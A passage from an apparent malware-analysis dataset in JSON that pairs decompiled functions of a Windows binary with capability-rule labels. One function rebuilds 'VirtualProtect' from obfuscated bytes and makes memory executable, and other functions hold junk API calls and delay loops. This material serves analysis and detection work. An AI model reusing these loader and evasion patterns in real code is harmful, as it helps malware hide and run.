            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00408e71)\n// WARNING: Removing unreachable block (ram,0x00408e77)\n// WARNING: Removing unreachable block (ram,0x00408e79)\n\nvoid fcn.00408e5d(void)\n\n{\n    return;\n}\n",
        "token_count": 65
    },
    "004153e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.004153e0(char *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    \n    iVar2 = -1;\n    do {\n        pcVar4 = arg_8h;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar4 = arg_8h + 1;\n        cVar1 = *arg_8h;\n        arg_8h = pcVar4;\n    } while (cVar1 != '\\0');\n    iVar2 = -(iVar2 + 1);\n    pcVar4 = pcVar4 + -1;\n    do {\n        pcVar3 = pcVar4;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar3 = pcVar4 + -1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar3;\n    } while (arg_ch != cVar1);\n    pcVar3 = pcVar3 + 1;\n    if (*pcVar3 != arg_ch) {\n        pcVar3 = NULL;\n    }\n    return pcVar3;\n}\n",
        "token_count": 275
    },
    "00415c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415c40(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00415b98(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "00415dbf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415dbf(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00415d17(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "0041abe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0041abe0(void)\n\n{\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    *0x2b75b68 = 0x6b;\n    *0x2b75b6c = 0x72;\n    uStack136 = 0x2b75b68;\n    *0x2b75b74 = 0x320033;\n    *0x2b75b7c = 0x6c006c;\n    *0x2b75b6e = 0x6e;\n    *0x2b75b70 = 0x6c0065;\n    *0x2b75b78 = 0x64002e;\n    *0x2b75b6a = 0x65;\n    *0x2b75b80 = 0;\n    uStack140 = 0x41ac50;\n    *0x2b75b60 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n    uStack104 = 0x605fdad6;\n    uStack48 = 0x3e1d73b5;\n    uStack116 = 0x748a784f;\n    uStack32 = 0x406ee06d;\n    uStack40 = 0x792cf4fa;\n    uStack28 = 0x1681d686;\n    uStack132 = 0x7f744a26;\n    uStack92 = 0x108aa678;\n    uStack64 = 0x2e8d3777;\n    uStack52 = 0x14922f4a;\n    uStack88 = 0x7cab3473;\n    uStack72 = 0x6cac10f2;\n    uStack12 = 0x51eed42d;\n    uStack96 = 0x71cc1e05;\n    uStack16 = 0x17a9a17f;\n    uStack36 = 0xb5fde22;\n    uStack44 = 0x22efe4df;\n    uStack20 = 0xee8079d;\n    uStack60 = 0x2783b42c;\n    uStack120 = 0x77340acd;\n    uStack24 = 0x249a0894;\n    uStack100 = 0x7ded3f3b;\n    uStack124 = 0xd271138d;\n    uStack84 = 0x6df36692;\n    uStack8 = 0x6ce68e74;\n    uStack128 = 0x68f0afd9;\n    uStack112 = 0x1b7f9e8e;\n    uStack80 = 0xd4344e33;\n    uStack76 = 0x9be5cfa;\n    uStack68 = 0x12698b6f;\n    uStack56 = 0xc67ffdbb;\n    uStack108 = 0xfc4e5034;\n    uStack140 = 0x44c350;\n    *0x44c35b = 0x65;\n    *0x44c351 = 0x75747269;\n    *0x44c355 = 0x6c61;\n    *0x44c350 = 0x56;\n    *0x44c35c = 0x7463;\n    *0x44c35e = 0;\n    *0x44c357 = 0x746f7250;\n    uStack144 = *0x2b75b60;\n    *0x44c34c = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    (**0x44c34c)(*0x2b75648, *0x2b75b64, 0x40, &stack0xffffff70);\n    return;\n}\n",
        "token_count": 1040
    },
    "0041b080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b080(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "0041b0a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b0a0(void)\n\n{\n    int32_t unaff_ESI;\n    uint uStack3124;\n    uint uStack3120;\n    uchar *puStack3116;\n    uint uStack3112;\n    uint uStack3108;\n    uint uStack3104;\n    uint uStack3100;\n    uchar auStack3084 [988];\n    uchar auStack2096 [2096];\n    \n    if (*0x2b75b64 == 0x37) {\n        uStack3100 = 0;\n        uStack3104 = 0x41b0b7;\n        (*_sym.imp.KERNEL32.dll_DeleteFileW)();\n        uStack3104 = 0x41b0bd;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uStack3104 = 0;\n        uStack3108 = 0;\n        uStack3112 = 0x41b0c7;\n        (*_sym.imp.KERNEL32.dll_IsDBCSLeadByteEx)();\n        uStack3112 = 0;\n        puStack3116 = &stack0xfffff3f4;\n        uStack3120 = 0;\n        uStack3124 = 0;\n        (*_sym.imp.KERNEL32.dll_GetFirmwareEnvironmentVariableA)();\n        (*_sym.imp.KERNEL32.dll_PeekConsoleInputW)(0, &stack0xfffff3d0, 0, &stack0xfffff3cc);\n        (*_sym.imp.KERNEL32.dll_SetEvent)(0);\n        (*_sym.imp.KERNEL32.dll_FindFirstVolumeMountPointW)(0x4035d8, &stack0xfffff7d0, 0);\n    }\n    *(*0x2b75648 + unaff_ESI) = *(*0x2b75f78 + 0x38d6 + unaff_ESI);\n    return;\n}\n",
        "token_count": 411
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iStack2188;\n    uint uStack2124;\n    uint uStack2120;\n    uint uStack2116;\n    uint uStack2112;\n    uint uStack2108;\n    uchar auStack2104 [48];\n    uchar auStack2056 [2052];\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_BuildCommDCBAndTimeoutsW;\n    pcVar2 = _sym.imp.KERNEL32.dll_SetCurrentDirectoryA;\n    pcVar1 = _sym.imp.KERNEL32.dll_VerSetConditionMask;\n    iStack2188 = 0x2443831;\n    do {\n        if (*0x2b75b64 == 0x47) {\n            (*pcVar2)(0x4036a4);\n            (*pcVar1)(0, 0, 0, 0);\n            uStack2120 = 0;\n            uStack2116 = 0;\n            uStack2112 = 0;\n            uStack2108 = 0;\n            uStack2124 = 0;\n            (*pcVar3)(0x4036e0, auStack2104, &uStack2124);\n        }\n        pcVar4 = _sym.imp.KERNEL32.dll_GlobalGetAtomNameW;\n        iStack2188 = iStack2188 + -1;\n        *0x2b75b64 = *0x44b6a8;\n    } while (iStack2188 != 0);\n    iVar6 = 0x79a863;\n    iVar5 = *0x44b6a8;\n    do {\n        if (iVar5 == 0x4c5) {\n            (*pcVar4)(0, auStack2056, 0);\n            iVar5 = *0x2b75b64;\n        }\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    uStack2112 = 0x2e4d9f95;\n    uStack2108 = 0x12a7ead5;\n    uStack2120 = 0x457ec49f;\n    uStack2116 = 0x3d844ce;\n    uStack2124 = 0xa52910fb;\n    *0x2b75f78 = *0x44b69c;\n    fcn.0041b360();\n    return 0;\n}\n",
        "token_count": 563
    },
    "0040ad80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ad80(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0040b112(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0041a7f4": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0041a7f4(void)\n\n{\n    *0x41df20 = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x403524, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 65
    },
    "0040399a": {
        "rules": [
            "move file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040399a(uint lpExistingFileName, uint lpNewFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_MoveFileA)(lpExistingFileName, lpNewFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.0040462e(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 129
    },
    "00404242": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404242(uint lpFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(lpFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.0040462e(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 117
    },
    "00404272": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint fcn.00404272(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(param_1);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.0040462e(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 117
    }
}